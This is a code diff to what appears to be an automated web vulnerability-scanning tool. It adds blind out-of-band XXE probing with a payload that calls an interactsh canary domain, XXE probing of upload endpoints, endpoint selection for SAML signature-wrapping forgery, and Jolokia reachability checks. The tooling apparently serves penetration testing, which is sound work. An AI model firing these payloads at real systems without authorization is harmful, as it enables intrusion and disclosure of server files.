@@ -7825,7 +7825,11 @@ def run_jwt_audit(domain: str) -> bool:
 
 
 def run_xxe_hunt(domain: str) -> bool:
-    """XXE probing (content-type swap + upload vector + blind OOB)."""
+    """XXE probing: content-type swap (always) + blind-OOB confirmation via a
+    spawned interactsh session (whenever the binary/token is available) +
+    upload-vector probing (only when scanner.sh's own upload-candidate
+    discovery — findings/upload/active_upload_probe.txt — found something;
+    this module has no independent upload-endpoint discovery of its own)."""
     import xxe_hunt
     import tls_impersonation
     import interactsh_client
@@ -7847,6 +7851,7 @@ def run_xxe_hunt(domain: str) -> bool:
 
     confirmed, candidates = 0, 0
     out_path = os.path.join(xxe_dir, "findings.txt")
+    oob_sent = 0
     for url in _collect_urls_from_file(urls_file, strip_query=False, limit=100):
         result = xxe_hunt.probe_content_type_swap(client, url, {})
         if result.verdict == "confirmed":
@@ -7858,11 +7863,80 @@ def run_xxe_hunt(domain: str) -> bool:
             with open(out_path, "a") as f:
                 f.write(f"[XXE-CANDIDATE] {url} | {result.evidence}\n")
 
+        # Blind-OOB variant: probe_content_type_swap (above) only ever sends
+        # the fixed in-band file:///etc/passwd payload, so a target that
+        # resolves the external entity but never reflects its content back
+        # (the classic blind-XXE case) is invisible to it. Send a second,
+        # separate content-type-swap request per URL with an entity pointing
+        # at THIS session's real, interactsh-issued canary domain
+        # (session.url) instead. session.token is only ever non-empty when
+        # interactsh-client actually confirmed a correlation domain from its
+        # own startup banner (see interactsh_client.spawn's docstring) — an
+        # empty token means "no real OOB channel available", not "match
+        # everything", so it must gate this block.
+        if session is not None and session.token:
+            oob_payload = (
+                '<?xml version="1.0"?>'
+                f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{session.url}/xxe-callback">]>'
+                "<root>&xxe;</root>"
+            )
+            client.post(url, headers={"Content-Type": "application/xml"}, data=oob_payload)
+            oob_sent += 1
+
+    if session is not None and session.token and oob_sent:
+        # interactsh-client assigns ONE correlation domain per spawned session
+        # (not one per HTTP request), so a callback proves at least one of the
+        # oob_sent URLs resolved the external entity out-of-band — the same
+        # coarse, whole-batch attribution hunt.py's existing Log4Shell OOB step
+        # (run_rce_scan, ~line 5850) already relies on for the identical reason.
+        log("info", f"XXE: waiting for blind-OOB callback(s) ({oob_sent} URL(s) probed)...")
+        time.sleep(8)
+        oob_result = xxe_hunt.confirm_blind_oob(session, session.token)
+        if oob_result.verdict == "confirmed":
+            confirmed += 1
+            with open(out_path, "a") as f:
+                f.write(f"[XXE-OOB-CONFIRMED] {oob_sent} URL(s) probed via {session.url} | {oob_result.evidence}\n")
+
+    # Upload-vector XXE: only run against endpoints scanner.sh's own upload
+    # discovery (Check "upload" → findings/upload/active_upload_probe.txt) has
+    # already found. This module does not implement its own upload-endpoint
+    # discovery — fabricating one here would violate this codebase's
+    # anti-fabrication discipline, so we degrade gracefully instead.
+    upload_candidates_file = os.path.join(findings_dir, "upload", "active_upload_probe.txt")
+    upload_urls: list[str] = []
+    if os.path.isfile(upload_candidates_file):
+        seen_upload: set[str] = set()
+        with open(upload_candidates_file, errors="ignore") as f:
+            for line in f:
+                tokens = line.split()
+                if len(tokens) > 1 and tokens[1].startswith(("http://", "https://")) and tokens[1] not in seen_upload:
+                    seen_upload.add(tokens[1])
+                    upload_urls.append(tokens[1])
+
+    upload_probed = 0
+    if upload_urls:
+        for endpoint in upload_urls[:20]:
+            upload_result = xxe_hunt.probe_upload_xxe(client, endpoint, doc_type="svg")
+            upload_probed += 1
+            if upload_result.verdict == "confirmed":
+                confirmed += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[XXE-UPLOAD-CONFIRMED] {endpoint} | {upload_result.evidence}\n")
+            elif upload_result.verdict == "candidate":
+                candidates += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[XXE-UPLOAD-CANDIDATE] {endpoint} | {upload_result.evidence}\n")
+    else:
+        log("info", "XXE hunt: no discovered upload endpoints "
+                     "(findings/upload/active_upload_probe.txt missing/empty, or scanner.sh's "
+                     "upload check was skipped) — upload-vector XXE skipped")
+
     if session is not None:
         session.stop()
 
     _brain_phase_complete("XXE HUNT", True,
-                           detail=f"target={domain} confirmed={confirmed} candidates={candidates}",
+                           detail=(f"target={domain} confirmed={confirmed} candidates={candidates} "
+                                   f"oob_probed={oob_sent} upload_probed={upload_probed}"),
                            artifacts={"xxe": xxe_dir})
     return True
 
@@ -7927,8 +8001,28 @@ def run_saml_xsw(domain: str) -> bool:
         _brain_phase_complete("SAML XSW", True, detail=f"target={domain} skipped: no captured assertion")
         return True
 
+    # Pick the real ACS/login endpoint out of everything Check 7 discovered
+    # (endpoints.txt also holds /saml/metadata, /adfs/ls, /sso/saml, etc.) —
+    # mirrors scanner.sh's own ACS_URL selection (Check 7:
+    # `grep "saml/acs\|saml/login"`) instead of blindly taking the 2nd
+    # whitespace token of the WHOLE file, which picked whichever endpoint
+    # scanner.sh happened to discover first (not necessarily the real ACS).
+    _acs_marker_re = re.compile(r"(?i)saml/acs|saml/login")
+    acs_url = ""
+    with open(endpoints_file, errors="ignore") as f:
+        for line in f:
+            if _acs_marker_re.search(line):
+                tokens = line.split()
+                if len(tokens) > 1:
+                    acs_url = tokens[1]
+                break
+    if not acs_url:
+        log("info", "SAML XSW: no ACS/login-shaped endpoint discovered by scanner.sh Check 7 — "
+                     "skipping forgery (would otherwise forge against an unrelated SAML endpoint)")
+        _brain_phase_complete("SAML XSW", True, detail=f"target={domain} skipped: no ACS/login endpoint discovered")
+        return True
+
     client = tls_impersonation.get_client(fingerprint="chrome124")
-    acs_url = open(endpoints_file).read().split()[1] if os.path.getsize(endpoints_file) else ""
     resource_url = os.environ.get("VAPT_SAML_PROTECTED_RESOURCE", "")
 
     confirmed_variants = []
@@ -7969,9 +8063,24 @@ def run_actuator_probe(domain: str) -> bool:
     out_dir = os.path.join(findings_dir, "actuator")
     os.makedirs(out_dir, exist_ok=True)
     out_path = os.path.join(out_dir, "findings.txt")
-    confirmed = candidates = 0
+    confirmed = candidates = jolokia_reachable = 0
 
     for url in actuator_urls:
+        if "jolokia" in url.lower():
+            # Jolokia's MBean-listing endpoint is a JMX-over-HTTP bridge, not a
+            # Spring-SpEL sink — check_spel_injection's ?expr= probe is
+            # meaningless against it. check_jolokia_reachability proves the RCE
+            # PRECONDITION (Jolokia reachable + MBeans listable) without
+            # executing anything, so it is logged as an info-severity coverage
+            # note and never auto-escalated to a confirmed/candidate finding
+            # on its own.
+            jolokia_result = springboot_actuator_probe.check_jolokia_reachability(client, url)
+            if jolokia_result.reachable:
+                jolokia_reachable += 1
+                with open(out_path, "a") as f:
+                    f.write(f"[JOLOKIA-REACHABLE] {url} | mbean_count={jolokia_result.mbean_count}\n")
+            continue
+
         if "env" in url:
             resp = client.get(url)
             try:
@@ -7993,7 +8102,8 @@ def run_actuator_probe(domain: str) -> bool:
                 f.write(f"[SPEL-CANDIDATE] {url} | {spel_result.detail}\n")
 
     _brain_phase_complete("ACTUATOR PROBE", True,
-                           detail=f"target={domain} confirmed={confirmed} candidates={candidates}",
+                           detail=(f"target={domain} confirmed={confirmed} candidates={candidates} "
+                                   f"jolokia_reachable={jolokia_reachable}"),
                            artifacts={"actuator": out_dir})
     return True
 
@@ -8014,6 +8124,8 @@ def run_ldap_injection(domain: str) -> bool:
     fingerprint_tags = {name.lower() for name in techs.keys()}
     if not ldap_injection_tester.looks_like_ldap_backed_auth(fingerprint_tags):
         log("info", "LDAP injection: stack fingerprint does not suggest LDAP-backed auth — skipping")
+        _brain_phase_complete("LDAP INJECTION", True,
+                               detail=f"target={domain} skipped: stack fingerprint does not suggest LDAP-backed auth")
         return True
     if _brain and _brain.enabled:
         _brain.phase_start("LDAP INJECTION", f"target={domain}")
